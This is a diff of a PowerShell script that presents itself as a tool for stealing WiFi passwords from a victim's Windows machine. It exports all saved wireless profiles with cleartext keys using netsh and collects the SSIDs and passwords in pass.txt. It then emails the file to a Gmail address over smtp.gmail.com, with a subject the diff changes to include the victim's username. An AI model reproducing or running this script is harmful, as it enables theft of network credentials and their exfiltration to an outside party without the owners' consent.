@@ -1,6 +1,3 @@
-
-
-
 // --> Export all Windows Wifi profiles (SSID, password) in XML
 
 netsh wlan export profile key=clear
@@ -14,8 +11,6 @@ $a= "==================SpeedCuber======================`r`n SSID = "+$xml.WLANPr
 Out-File pass.txt -Append -InputObject $a
 
 }
-
-//Start-Sleep -s 5
 
 // --> Mail pass.txt
 
@@ -41,7 +36,7 @@ $SMTPServer = 'smtp.gmail.com'
   $ReportEmail.To.Add('speedcuber@gmail.com') // --> Replace it with your Gmail username 
 
  
-  $ReportEmail.Subject = 'WIFI PASS Report'
+  $ReportEmail.Subject = 'WIFI Pass Report of ' + $env:UserName
   
  
   $ReportEmail.Body = 'Attached is your victim WIFI Passwords'
